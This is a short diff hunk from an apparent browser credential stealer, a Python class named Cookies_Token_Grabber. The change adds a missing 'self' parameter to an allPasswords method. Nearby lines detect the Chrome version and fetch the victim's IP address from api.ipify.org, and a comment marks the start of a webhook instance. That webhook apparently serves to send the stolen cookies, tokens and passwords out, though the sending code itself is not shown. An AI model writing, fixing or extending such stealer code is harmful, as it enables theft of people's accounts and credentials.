@@ -134,7 +134,7 @@ class Cookies_Token_Grabber:
         except:
             return "Chrome < 80"
 
-    def allPasswords():
+    def allPasswords(self):
         ipaddr = get('https://api.ipify.org').text  # Get IP address
 
     # Start webhook instance
